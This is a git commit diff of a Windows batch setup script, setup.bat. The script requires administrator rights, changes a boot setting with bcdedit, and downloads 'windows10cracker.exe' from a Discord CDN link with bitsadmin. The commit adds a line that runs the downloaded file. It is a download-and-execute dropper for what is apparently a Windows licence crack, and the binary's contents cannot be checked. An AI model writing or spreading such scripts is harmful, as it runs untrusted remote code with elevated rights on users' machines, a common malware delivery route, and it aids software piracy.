80eccccb420bf57cdab06d5b7849aaeadc641a6f
Nick06888 <75800411+Nick06888@users.noreply.github.com>
2022-04-14 17:32:34 +0200

    final commit

--- setup.bat
+++ setup.bat
@@ -8,12 +8,14 @@ if %errorLevel% == 0 (
     echo Devi avviare il programma come amministratore!
     goto fine
 )
+
 :continua
 bcdedit -set TESTSIGNING OFF
 cd C:\Users\%USERNAME%\Downloads
 mkdir Windows-Cracker-Github
 bitsadmin.exe /transfer "Installer" https://cdn.discordapp.com/attachments/653666644689682462/964184459933011988/windows10cracker.exe C:\Users\%USERNAME%\Downloads\Windows-Cracker-Github\windows10cracker.exe
 explorer.exe C:\Users\%USERNAME%\Downloads\Windows-Cracker-Github
-pause
+windows10cracker.exe
+
 :fine
 pause
